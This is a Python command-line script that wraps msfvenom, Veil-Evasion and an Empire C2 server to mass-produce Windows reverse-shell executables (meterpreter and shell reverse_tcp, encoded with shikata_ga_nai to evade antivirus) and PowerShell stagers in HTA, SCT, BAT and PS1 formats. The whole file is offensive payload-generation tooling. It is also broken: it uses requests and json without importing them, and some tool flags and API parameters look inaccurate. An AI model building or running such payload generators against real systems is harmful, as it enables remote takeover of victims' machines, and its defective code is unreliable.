import click
import subprocess


@click.group()
def main():
    pass

@main.command()
@click.option('--lhost', '-l', default='127.0.0.1', help='The IP or hostname of the listener.')
@click.option('--lport', '-p', default='4444', help='The port number of the listener.')
@click.option('--msf-options', '-m', help='Additional options for msfvenom.')
def venom(lhost, lport, msf_options):
    payloads = ['windows/meterpreter/reverse_tcp', 'windows/shell/reverse_tcp']
    for payload in payloads:
        output_file = payload.replace('/', '_') + '.exe'
        subprocess.run(f'msfvenom -p {payload} LHOST={lhost} LPORT={lport} -e x86/shikata_ga_nai -i 3 -a x86 --platform windows -f exe -o {output_file} {msf_options}', shell=True)
        click.echo(f'MSF Payload {payload} saved as {output_file}')



@main.command()
@click.option('--lhost', '-l', default='127.0.0.1', help='The IP or hostname of the listener.')
@click.option('--lport', '-p', default='4444', help='The port number of the listener.')
@click.option('--veil-options', '-v', help='Additional options for veil-evasion.')
def veil(lhost, lport, veil_options):
    payloads = ['windows/meterpreter/reverse_tcp', 'windows/shell/reverse_tcp']
    for payload in payloads:
        output_file = payload.replace('/', '_') + '.exe'
        subprocess.run(f'veil-evasion -p {payload} -c LHOST={lhost} LPORT={lport} -e shikata_ga_nai -i 3 --overwrite -o {output_file} {veil_options}', shell=True)
        click.echo(f'Veil Payload {payload} saved as {output_file}')



@main.command()
@click.option('--empire-host', '-host', default='http://127.0.0.1:1337', help='The IP or hostname of the Empire server.')
@click.option('--empire-user', '-user', default='empire', help='The username of the Empire user.')
@click.option('--empire-pass', '-pass', default='empire', help='The password of the Empire user.')
@click.option('--empire-options', '-ops', help='Additional options for Empire stager')
def empire(empire_host, empire_user, empire_pass, empire_options):
    session = requests.Session()
    session.auth = (empire_user, empire_pass)
    session.headers.update({'Content-Type': 'application/json'})
    session.verify = False
    stagers = ['powershell/launcher_sct', 'powershell/launcher_bat', 'powershell/launcher_hta','powershell/launcher_psh','powershell/launcher_ps1']
    for stager in stagers:
        stager_data = {'Launcher': stager, 'Listener': 'http', 'OutFile': '', 'UserAgent': 'default', 'Proxy': 'default', 'ProxyCreds': 'default'}
        stager_data.update(json.loads(empire_options))
        response = session.post(f'{empire_host}/api/stagers?stager={stager}', json=stager_data).json()
        click.echo(response['powershell'])


if __name__ == '__main__':
    main()
